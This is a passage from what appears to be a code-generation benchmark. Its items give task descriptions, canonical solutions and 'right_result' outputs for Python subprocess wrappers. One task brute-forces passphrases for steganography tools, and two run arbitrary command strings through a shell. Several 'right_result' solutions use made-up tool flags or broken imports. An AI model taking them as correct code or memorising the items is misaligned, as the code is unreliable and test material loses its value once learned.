    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport logging\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self.nbest = nbest\n\n    def execute(self, input, is_file=False):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % self.fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if self.nbest is not None:\n            cmd.extend(['--nbest=%d' % self.nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport logging\nimport os\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, input, is_file=False):\n        if is_file:\n            cmd = ['phonetisaurus', '-f', self.fst_model, '-n', str(self.nbest), '-i', input]\n        else:\n            cmd = ['phonetisaurus', '-f', self.fst_model, '-n', str(self.nbest), '-i', input]\n\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n\n        if process.returncode != 0:\n            self._logger.error(f\"Error executing Phonetisaurus G2P: {stderr.decode()}\")\n            raise RuntimeError(f\"Phonetisaurus G2P execution failed: {stderr.decode()}\")\n\n        result = {}\n        lines = stdout.decode().splitlines()\n        for line in lines:\n            if line.strip():\n                parts = line.split()\n                word = parts[0]\n                pronunciations = parts[1:]\n                result[word] = pronunciations\n\n        return result"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Implement a function that evaluates coreference resolution results using the official CoNLL-2012 evaluation script, parsing and returning the recall, precision, and F1 scores.\n\nFunction Description: The function `official_conll_eval` executes the official CoNLL-2012 evaluation script as a subprocess, captures its output, and parses the recall, precision, and F1 scores from the output. It can optionally log the official output for debugging or reporting purposes.\n\nInput:\n- `gold_path` (str): Path to the file containing gold-standard coreference annotations.\n- `predicted_path` (str): Path to the file containing predicted coreference annotations.\n- `metric` (str): The evaluation metric to compute (e.g., \"muc\", \"bcub\", \"ceafe\").\n- `official_stdout` (bool, optional): If True, logs the official evaluation script output. Defaults to True.\n\nOutput:\n- Returns a dictionary with the following keys:\n  - \"r\" (float): Recall score in percentage.\n  - \"p\" (float): Precision score in percentage.\n  - \"f\" (float): F1 score in percentage.",
    "Canonical_solution": "import re\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\nCOREF_RESULTS_REGEX = re.compile(r\".*Coreference: Recall: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tPrecision: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tF1: ([0-9.]+)%.*\", re.DOTALL)\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = [\"conll-2012/scorer/v8.01/scorer.pl\", metric, gold_path, predicted_path, \"none\"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    process.wait()\n\n    stdout = stdout.decode(\"utf-8\")\n    if stderr is not None:\n        logger.error(stderr)\n\n    if official_stdout:\n        logger.info(\"Official result for {}\".format(metric))\n        logger.info(stdout)\n\n    coref_results_match = re.match(COREF_RESULTS_REGEX, stdout)\n    recall = float(coref_results_match.group(1))\n    precision = float(coref_results_match.group(2))\n    f1 = float(coref_results_match.group(3))\n    return {\"r\": recall, \"p\": precision, \"f\": f1}",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = [\n        'perl', 'conll2012-eval', '-m', metric, gold_path, predicted_path\n    ]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if official_stdout:\n        print(stdout.decode('utf-8'))\n    output = stdout.decode('utf-8')\n    \n    # Extract precision, recall, f1 from the output\n    pattern = r'Precision: (\\d+\\.\\d+)%\\s+Recall: (\\d+\\.\\d+)%\\s+F1: (\\d+\\.\\d+)%'\n    match = re.search(pattern, output)\n    if match:\n        p, r, f = match.groups()\n        return {\n            \"r\": float(r),\n            \"p\": float(p),\n            \"f\": float(f)\n        }\n    else:\n        raise ValueError(\"Could not parse evaluation results from output.\")"
  },
  {
    "Task_id": 293,
    "Instruction": "Task Description: Implement a set of steganography cracking classes that utilize subprocess communication to interact with different steganography tools (steghide, outguess, outguess-0.13, and openstego) for extracting hidden data from files.\n\nClass Description: Each class implements a specific steganography tool cracker using subprocess communication to interact with the respective command-line tool. The classes follow a similar pattern of spawning a subprocess, communicating with it via pipes, and analyzing the output to determine if the correct passphrase was found.\n\nAttributes:\nNone (These are stateless classes that don't maintain instance attributes)\n\nMethods:\n\nMethod1: crack_function(stego_file: str, passphrase: str) -> None - Attempts to extract hidden data from the given stego_file using the provided passphrase. Prints success message and exits if found, otherwise continues silently.\n\nClasses:\n\n1. ThreadedSteghideCracker:\n   - Uses 'steghide' command-line tool\n   - Checks for embedded file information in output\n   - Prints extraction command on success\n\n2. ThreadedOutguessCracker:\n   - Uses 'outguess' command-line tool\n   - Creates temporary file for output\n   - Validates extracted data for ASCII content\n   - Prints secret message and cleanup command on success\n\n3. ThreadedOutguess013Cracker:\n   - Uses 'outguess-0.13' command-line tool\n   - Similar functionality to ThreadedOutguessCracker\n   - Handles older version of outguess\n\n4. ThreadedOpenstegoCracker:\n   - Uses 'openstego' command-line tool\n   - Checks stderr for extraction success\n   - Prints extracted file path on success\n\nAll methods:\n- Use subprocess.Popen with stdout/stderr pipes\n- Process communication via communicate()\n- Include proper error handling\n- Exit program on successful extraction\n- Include cleanup for temporary files where applicable",
    "Canonical_solution": "import subprocess\nimport re\nimport sys\nimport os\nimport md5\n\nclass ThreadedSteghideCracker:\n    def crack_function(self, stego_file, passphrase):\n        process = subprocess.Popen(['steghide',\n                                  'info',\n                                  stego_file,\n                                  '-p', passphrase],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        m = re.search(r\"embedded file \\\"(.*)\\\"\", out)\n        if m is not None:\n            print(\"\\nFound '{}'!\\n\\\nExtract with `steghide extract -sf {} -p \\\"{}\\\"`\"\n                  .format(m.group(1), stego_file, passphrase))\n            sys.exit(0)\n\nclass ThreadedOutguessCracker:\n    def crack_function(self, stego_file, passphrase):\n        tmp_file = \"/tmp/{}\".format(md5.new(passphrase).hexdigest())\n        process = subprocess.Popen(['outguess',\n                                  '-k', passphrase,\n                                  '-r', stego_file,\n                                  tmp_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        try:\n            with open(tmp_file, \"r\") as f:\n                data = f.read()\n                if len(data) > 0:\n                    ascii_data = \"\".join(filter(lambda x: ord(x) < 128, data))\n                    if float(len(ascii_data)) / float(len(data)) > 0.8:\n                        print(\"\\nFound secret message:\\n---\\n{}\\n---\\n\\\nExtract with `outguess -k \\\"{}\\\" -r {} /tmp/outguess_secret.txt`\"\n                              .format(ascii_data, passphrase, stego_file))\n                        sys.exit(0)\n        finally:\n            os.remove(tmp_file)\n\nclass ThreadedOutguess013Cracker:\n    def crack_function(self, stego_file, passphrase):\n        tmp_file = \"/tmp/{}\".format(md5.new(passphrase).hexdigest())\n        process = subprocess.Popen(['outguess-0.13',\n                                  '-k', passphrase,\n                                  '-r', stego_file,\n                                  tmp_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        try:\n            with open(tmp_file, \"r\") as f:\n                data = f.read()\n                if len(data) > 0:\n                    ascii_data = \"\".join(filter(lambda x: ord(x) < 128, data))\n                    if float(len(ascii_data)) / float(len(data)) > 0.8:\n                        print(\"\\nFound secret message:\\n---\\n{}\\n---\\n\\\nExtract with `outguess -k \\\"{}\\\" -r {} /tmp/outguess_secret.txt`\"\n                              .format(ascii_data, passphrase, stego_file))\n                        sys.exit(0)\n        finally:\n            os.remove(tmp_file)\n\nclass ThreadedOpenstegoCracker:\n    def crack_function(self, stego_file, passphrase):\n        process = subprocess.Popen(['openstego', 'extract',\n                                  '-p', passphrase,\n                                  '-sf', stego_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        m = re.search(r\"Extracted file: (.*)\", err)\n        if m is not None:\n            print(\"\\nFound '{}'!\\n\\\nExtract with `openstego extract -sf {} -p \\\"{}\\\"`\"\n                  .format(m.group(1), stego_file, passphrase))\n            sys.exit(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport os\n\nclass ThreadedSteghideCracker:\n    def crack_function(self, stego_file: str, passphrase: str) -> None:\n        command = ['steghide', 'extract', '-sf', stego_file, '-p', passphrase]\n        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        if b'Embedding' in stdout or b'Found' in stdout:\n            print(f\"Extraction command: {' '.join(command)}\")\n            exit()\n\nclass ThreadedOutguessCracker:\n    def crack_function(self, stego_file: str, passphrase: str) -> None:\n        temp_file = 'temp_outguess.txt'\n        command = ['outguess', 'extract', '-f', stego_file, '-p', passphrase, '-o', temp_file]\n        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        if not stderr:\n            with open(temp_file, 'r') as f:\n                content = f.read()\n            if content.isprintable():\n                print(f\"Secret message: {content}\")\n                print(f\"Cleanup command: rm -f {temp_file}\")\n                exit()\n        os.remove(temp_file)\n\nclass ThreadedOutguess013Cracker:\n    def crack_function(self, stego_file: str, passphrase: str) -> None:\n        temp_file = 'temp_outguess013.txt'\n        command = ['outguess-0.13', 'extract', '-f', stego_file, '-p', passphrase, '-o', temp_file]\n        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        if not stderr:\n            with open(temp_file, 'r') as f:\n                content = f.read()\n            if content.isprintable():\n                print(f\"Secret message: {content}\")\n                print(f\"Cleanup command: rm -f {temp_file}\")\n                exit()\n        os.remove(temp_file)\n\nclass ThreadedOpenstegoCracker:\n    def crack_function(self, stego_file: str, passphrase: str) -> None:\n        command = ['openstego', 'extract', '-f', stego_file, '-p', passphrase]\n        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        if b'Extracted' in stderr:\n            print(f\"Extracted file path: {stego_file}\")\n            exit()"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module with pipe-based inter-process communication.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the output through a pipe, and return the decoded output string. It should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: [str] - The system command to be executed as a string\n\nOutput:\n- [str] - The decoded output from the executed command, as a string",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    status = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef execute_command(com):\n    process = subprocess.Popen(com, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    stdout, stderr = process.communicate()\n    return stdout"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Implement a class to collect and analyze OSSEC (Open Source Host-based Intrusion Detection System) agent states using subprocess communication.\n\nClass Description: The OssecCollector class interacts with the OSSEC agent control utility to retrieve agent status information and parse the results into a structured format. It handles command execution with optional sudo privileges and processes the output to count agent states.\n\nAttributes:\n- bin_path: [str] - Path to the OSSEC agent_control binary (default: '/var/ossec/bin/agent_control')\n- use_sudo: [bool] - Flag indicating whether to use sudo for command execution (default: True)\n- sudo_cmd: [str] - Path to the sudo binary (default: '/usr/bin/sudo')\n\nMethods:\n- __init__(bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None - Initializes the collector with configuration paths\n- collect() -> dict - Executes the agent control command, processes the output, and returns a dictionary counting agent states by status\n\nThe implementation should use subprocess.PIPE for inter-process communication and handle potential execution errors appropriately.",
    "Canonical_solution": "import subprocess\nimport re\nfrom diamond.collector import str_to_bool\n\nclass OssecCollector:\n    def __init__(self, bin_path='/var/ossec/bin/agent_control', use_sudo=True, sudo_cmd='/usr/bin/sudo'):\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self):\n        command = [self.bin_path, '-l']\n\n        if str_to_bool(self.use_sudo):\n            command.insert(0, self.sudo_cmd)\n\n        try:\n            p = subprocess.Popen(command, stdout=subprocess.PIPE)\n            res = p.communicate()[0]\n        except Exception as e:\n            raise Exception('Unable to exec cmd: %s, because %s' % (' '.join(command), str(e)))\n\n        if res == '':\n            raise Exception('Empty result from exec cmd: %s' % (' '.join(command)))\n\n        states = {}\n        for line in res.split(\"\\n\"):\n            if not line.startswith('   ID: '):\n                continue\n            fragments = line.split(',')\n            state = fragments[-1].lstrip()\n            if state not in states:\n                states[state] = 1\n            else:\n                states[state] += 1\n\n        return states",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\nclass OssecCollector:\n    def __init__(self, bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None:\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self) -> dict:\n        command = [self.bin_path, 'status']\n        if self.use_sudo:\n            command = [self.sudo_cmd] + command\n        \n        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        stdout, stderr = process.communicate()\n        \n        if process.returncode != 0:\n            raise RuntimeError(f\"Failed to execute OSSEC agent control command: {stderr}\")\n        \n        states = {}\n        lines = stdout.strip().split('\\n')\n        for line in lines:\n            if line.startswith('Agent'):\n                parts = line.split()\n                agent_id = parts[1]\n                status = parts[3]\n                states[agent_id] = status\n        \n        return states"
  },
  {
    "Task_id": 3,
    "Instruction": "Task Description: Implement an asynchronous Kafka consumer in Python using the aiokafka library to subscribe to topics, consume messages, and handle batch processing with configurable timeouts and maximum records.\n\nClass Description: The LogicSubscriber class is an abstract base class that provides core functionality for consuming messages from Kafka topics asynchronously. It handles connection management, message consumption, and error handling. The DefaultSubscriber and BatchSubscriber classes extend this functionality for single-message and batch-message consumption respectively.\n\nAttributes:\n\ntopics: Sequence[str] - List of Kafka topics to subscribe to\ngroup_id: Optional[str] - Consumer group ID for Kafka\nconsumer: Optional[AIOKafkaConsumer] - The aiokafka consumer instance\npartitions: Iterable[TopicPartition] - Specific partitions to consume from\n__connection_args: Dict[str, Any] - Connection arguments for Kafka consumer\n\nMethods:\n\n__init__(*topics: str, group_id: Optional[str], connection_args: Dict[str, Any], partitions: Iterable[TopicPartition], default_parser: AsyncCallable, default_decoder: AsyncCallable) -> None - Initializes the subscriber with topics, group ID, connection args, partitions, and message processing callables.\n\nstart() -> None - Creates and starts the Kafka consumer, subscribing to topics or assigning partitions.\n\nclose() -> None - Stops and cleans up the Kafka consumer.\n\nget_msg() -> MsgType - Abstract method to be implemented by subclasses for retrieving messages.\n\n_consume() -> None - Main consumption loop that processes messages and handles errors.\n\nDefaultSubscriber Methods:\n\nget_msg() -> ConsumerRecord - Retrieves a single message from Kafka.\n\nBatchSubscriber Methods:\n\n__init__(*topics: str, batch_timeout_ms: int, max_records: Optional[int], **kwargs: Any) -> None - Extends initialization with batch-specific parameters.\n\nget_msg() -> Tuple[ConsumerRecord, ...] - Retrieves a batch of messages from Kafka with configurable timeout and maximum records.",
    "Canonical_solution": "from typing import Optional, Iterable, Sequence, Dict, Any, Tuple\nfrom abc import ABC, abstractmethod\nfrom itertools import chain\nimport anyio\nfrom aiokafka import ConsumerRecord, TopicPartition\nfrom aiokafka.errors import ConsumerStoppedError, KafkaError\nfrom faststream.broker.subscriber.usecase import SubscriberUsecase\nfrom faststream.broker.types import AsyncCallable, BrokerMiddleware, MsgType\nfrom faststream.broker.utils import process_msg\nfrom faststream.kafka.message import KafkaAckableMessage, KafkaMessage\nfrom faststream.kafka.parser import AioKafkaBatchParser, AioKafkaParser\n\nclass LogicSubscriber(ABC, SubscriberUsecase[MsgType]):\n    topics: Sequence[str]\n    group_id: Optional[str]\n    consumer: Optional[\"AIOKafkaConsumer\"]\n\n    def __init__(\n        self,\n        *topics: str,\n        group_id: Optional[str],\n        connection_args: Dict[str, Any],\n        partitions: Iterable[TopicPartition],\n        default_parser: AsyncCallable,\n        default_decoder: AsyncCallable,\n    ) -> None:\n        super().__init__(\n            default_parser=default_parser,\n            default_decoder=default_decoder,\n        )\n        self.topics = topics\n        self.partitions = partitions\n        self.group_id = group_id\n        self.__connection_args = connection_args\n        self.consumer = None\n\n    async def start(self) -> None:\n        self.consumer = consumer = self.builder(\n            group_id=self.group_id,\n            client_id=self.client_id,\n            **self.__connection_args,\n        )\n\n        if self.topics:\n            consumer.subscribe(topics=self.topics)\n        elif self.partitions:\n            consumer.assign(partitions=self.partitions)\n\n        await consumer.start()\n\n    async def close(self) -> None:\n        if self.consumer is not None:\n            await self.consumer.stop()\n            self.consumer = None\n\n    @abstractmethod\n    async def get_msg(self) -> MsgType:\n        raise NotImplementedError()\n\n    async def _consume(self) -> None:\n        while self.running:\n            try:\n                msg = await self.get_msg()\n                if msg:\n                    await self.consume_one(msg)\n            except KafkaError:\n                await anyio.sleep(5)\n            except ConsumerStoppedError:\n                return\n\nclass DefaultSubscriber(LogicSubscriber[ConsumerRecord]):\n    async def get_msg(self) -> ConsumerRecord:\n        assert self.consumer, \"Consumer not initialized\"\n        return await self.consumer.getone()\n\nclass BatchSubscriber(LogicSubscriber[Tuple[ConsumerRecord, ...]]):\n    def __init__(\n        self,\n        *topics: str,\n        batch_timeout_ms: int,\n        max_records: Optional[int],\n        **kwargs: Any,\n    ) -> None:\n        super().__init__(*topics, **kwargs)\n        self.batch_timeout_ms = batch_timeout_ms\n        self.max_records = max_records\n\n    async def get_msg(self) -> Tuple[ConsumerRecord, ...]:\n        assert self.consumer, \"Consumer not initialized\"\n        messages = await self.consumer.getmany(\n            timeout_ms=self.batch_timeout_ms,\n            max_records=self.max_records,\n        )\n        return tuple(chain(*messages.values())) if messages else ()",
    "Code_level": "Class-level",
    "FSMID_for_test": 80,
    "right_result": "from aiokafka import AIOKafkaConsumer, TopicPartition\nfrom abc import ABC, abstractmethod\nimport asyncio\nfrom typing import Any, Dict, Iterable, Optional, Sequence, Tuple, TypeVar, AsyncCallable, Generic, Union\n\nT = TypeVar('T')\n\nclass LogicSubscriber(ABC, Generic[T]):\n    def __init__(self, *topics: str, group_id: Optional[str], connection_args: Dict[str, Any], partitions: Iterable[TopicPartition], default_parser: AsyncCallable, default_decoder: AsyncCallable) -> None:\n        self.topics = topics\n        self.group_id = group_id\n        self.consumer: Optional[AIOKafkaConsumer] = None\n        self.partitions = partitions\n        self.__connection_args = connection_args\n        self.default_parser = default_parser\n        self.default_decoder = default_decoder\n\n    async def start(self) -> None:\n        self.consumer = AIOKafkaConsumer(\n            *self.topics,\n            group_id=self.group_id,\n            **self.__connection_args\n        )\n        await self.consumer.start()\n        if self.partitions:\n            await self.consumer.assign(self.partitions)\n\n    async def close(self) -> None:\n        if self.consumer:\n            await self.consumer.stop()\n            await self.consumer.close()\n\n    @abstractmethod\n    async def get_msg(self) -> T:\n        pass\n\n    async def _consume(self) -> None:\n        try:\n            async for msg in self.consumer:\n                try:\n                    parsed = await self.default_parser(msg.value)\n                    decoded = await self.default_decoder(parsed)\n                    await self.get_msg()\n                except Exception as e:\n                    print(f\"Error processing message: {e}\")\n        except Exception as e:\n            print(f\"Consumer error: {e}\")\n\nclass DefaultSubscriber(LogicSubscriber[ConsumerRecord]):\n    def __init__(self, *topics: str, group_id: Optional[str], connection_args: Dict[str, Any], partitions: Iterable[TopicPartition], default_parser: AsyncCallable, default_decoder: AsyncCallable) -> None:\n        super().__init__(*topics, group_id=group_id, connection_args=connection_args, partitions=partitions, default_parser=default_parser, default_decoder=default_decoder)\n\n    async def get_msg(self) -> ConsumerRecord:\n        return await self.consumer.next()\n\n\nclass BatchSubscriber(LogicSubscriber[Tuple[ConsumerRecord, ...]]):\n    def __init__(self, *topics: str, batch_timeout_ms: int, max_records: Optional[int], group_id: Optional[str], connection_args: Dict[str, Any], partitions: Iterable[TopicPartition], default_parser: AsyncCallable, default_decoder: AsyncCallable) -> None:\n        self.batch_timeout_ms = batch_timeout_ms\n        self.max_records = max_records\n        super().__init__(*topics, group_id=group_id, connection_args=connection_args, partitions=partitions, default_parser=default_parser, default_decoder=default_decoder)\n\n    async def get_msg(self) -> Tuple[ConsumerRecord, ...]:\n        messages = []\n        timeout = self.batch_timeout_ms / 1000.0\n        max_records = self.max_records or 10\n        while len(messages) < max_records:\n            try:\n                async for msg in self.consumer:\n                    parsed = await self.default_parser(msg.value)\n                    decoded = await self.default_decoder(parsed)\n                    messages.append(msg)\n                    if len(messages) == max_records:\n                        break\n            except asyncio.TimeoutError:\n                break\n        return tuple(messages)"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Create a function that executes a shell command using Python's subprocess module and returns the output, error, and process object.\n\nFunction Description: The function SC (Shell Command) takes a shell command as input, executes it using subprocess.Popen, and captures both the standard output and standard error streams. It returns a tuple containing these outputs along with the process object for further interaction if needed.\n\nInput: \n- cmd: [str] - The shell command to be executed as a string.\n\nOutput: \n- Returns a tuple containing:\n  - out: [bytes] - The standard output of the executed command.\n  - err: [bytes] - The standard error of the executed command.\n  - proc: [subprocess.Popen] - The process object representing the executed command.",
    "Canonical_solution": "import os\nimport subprocess\n\ndef SC(cmd):\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    [out, err] = proc.communicate()\n    return (out, err, proc)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "def SC(cmd):\n    import subprocess\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out, err = proc.communicate()\n    return out, err, proc"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Python class that collects and parses statistics from the amavisd-agent program using subprocess communication.\n\nClass Description: The AmavisCollector class is designed to interface with the amavisd-agent program to collect mail processing statistics. It uses subprocess.PIPE to communicate with the agent process and regular expressions to parse the output. The class supports optional sudo execution for privilege escalation.\n\nAttributes:\n\nmatchers: [List[re.Pattern]] - A list of compiled regular expressions used to parse different formats of statistics from amavisd-agent output.\nconfig: [Dict[str, Any]] - Configuration dictionary containing paths to executables and sudo settings.\n\nMethods:\n\n__init__: [Name](amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis') -> None - Initializes the collector with configuration parameters for the amavisd-agent executable and optional sudo settings.\ncollect: [Name]() -> Generator[Tuple[str, str, str], None, None] - Executes the amavisd-agent process, captures its output, and yields parsed statistics as tuples of (metric_name, metric_type, value). Raises an exception if the process cannot be executed.",
    "Canonical_solution": "import os\nimport subprocess\nimport re\n\nclass AmavisCollector:\n    matchers = [\n        re.compile(r'^\\s*(?P<name>[\\w]+)\\s+(?P<time>[\\d]+) s\\s+'\n                   r'(?P<frequency>[\\d.]+) s/msg\\s+\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<count>[\\d]+)\\s+'\n                   r'(?P<frequency>[\\d.]+)/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<size>[\\d]+)MB\\s+'\n                   r'(?P<frequency>[\\d.]+)MB/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n    ]\n\n    def __init__(self, amavisd_exe='/usr/sbin/amavisd-agent', use_sudo=False, sudo_exe='/usr/bin/sudo', sudo_user='amavis'):\n        self.config = {\n            'amavisd_exe': amavisd_exe,\n            'use_sudo': use_sudo,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user\n        }\n\n    def collect(self):\n        try:\n            if self.config['use_sudo']:\n                cmdline = [\n                    self.config['sudo_exe'], '-u', self.config['sudo_user'],\n                    '--', self.config['amavisd_exe'], '-c', '1'\n                ]\n            else:\n                cmdline = [self.config['amavisd_exe'], '-c', '1']\n                \n            agent = subprocess.Popen(cmdline, stdout=subprocess.PIPE)\n            agent_out = agent.communicate()[0]\n            lines = agent_out.strip().split(os.linesep)\n            \n            for line in lines:\n                for rex in self.matchers:\n                    res = rex.match(line)\n                    if res:\n                        groups = res.groupdict()\n                        name = groups['name']\n                        for metric, value in groups.items():\n                            if metric == 'name':\n                                continue\n                            yield (name, metric, value)\n\n        except OSError as err:\n            raise Exception(f\"Could not run {self.config['amavisd_exe']}: {err}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import re\nimport subprocess\nfrom typing import List, Dict, Any, Generator\n\nclass AmavisCollector:\n    def __init__(self, amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis') -> None:\n        self.matchers: List[re.Pattern] = []\n        self.config: Dict[str, Any] = {\n            'amavisd_exe': amavisd_exe,\n            'use_sudo': use_sudo,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user\n        }\n\n    def collect(self) -> Generator[Tuple[str, str, str], None, None]:\n        cmd = [self.config['amavisd_exe']]\n        if self.config['use_sudo']:\n            cmd = [self.config['sudo_exe'], '-u', self.config['sudo_user']] + cmd\n\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        stdout, stderr = process.communicate()\n\n        if process.returncode != 0:\n            raise Exception(f\"Failed to execute amavisd-agent: {stderr}\")\n\n        for matcher in self.matchers:\n            for line in stdout.splitlines():\n                match = matcher.match(line)\n                if match:\n                    yield (match.group(1), match.group(2), match.group(3))"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a class that interacts with partclone utility to retrieve and parse partition information from disk image files, handling potential compression and chaining multiple subprocesses together.\n\nClass Description: The Partclone class provides static methods for working with partclone disk images, particularly focused on extracting partition information through a chain of subprocess operations.\n\nMethods:\n\nMethod1: get_partclone_info_dict(abs_partclone_image_list: list, image_key: str, compression: str) -> dict - Retrieves partition information from partclone image files by executing a chain of subprocess commands (cat, decompression, and partclone.info). Returns a dictionary containing parsed partition information.\n\nInput:\n- abs_partclone_image_list: List of absolute paths to partclone image files\n- image_key: String identifier for the image\n- compression: String specifying compression type (used for decompression)\n\nOutput:\n- Dictionary containing parsed partition information, with 'filesystem' as a minimum key (set to \"<unknown>\" if parsing fails)\n\nMethod2: parse_partclone_info_output(output: str) -> dict - [Implied but not shown in code] Parses the output string from partclone.info command into a structured dictionary. This would be a helper method called by get_partclone_info_dict.\n\nInput:\n- output: String containing the raw output from partclone.info command\n\nOutput:\n- Dictionary containing structured partition information extracted from the output",
    "Canonical_solution": "import collections\nimport subprocess\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list, image_key, compression):\n        env = utility.Utility.get_env_C_locale()\n        proc = collections.OrderedDict()\n        cat_cmd_list = [\"cat\"] + abs_partclone_image_list\n        decompression_cmd_list = utility.Utility.get_decompression_command_list(compression)\n        partclone_info_cmd_list = [\"partclone.info\", \"--source\", \"-\"]\n        utility.Utility.print_cli_friendly(\"partclone \", [cat_cmd_list, decompression_cmd_list, partclone_info_cmd_list])\n        proc['cat_partclone' + image_key] = subprocess.Popen(cat_cmd_list, stdout=subprocess.PIPE, env=env,\n                                                                          encoding='utf-8')\n        proc['decompression' + image_key] = subprocess.Popen(decompression_cmd_list,\n                                                                          stdin=proc[\n                                                                              'cat_partclone' + image_key].stdout,\n                                                                          stdout=subprocess.PIPE, env=env, encoding='utf-8')\n        proc['partclone_info' + image_key] = subprocess.Popen(partclone_info_cmd_list,\n                                                                           stdin=proc[\n                                                                               'decompression' + image_key].stdout,\n                                                                           stdout=subprocess.PIPE,\n                                                                           stderr=subprocess.PIPE, env=env,\n                                                                           encoding='utf-8')\n        proc['cat_partclone' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        proc['decompression' + image_key].stdout.close()  # Allow 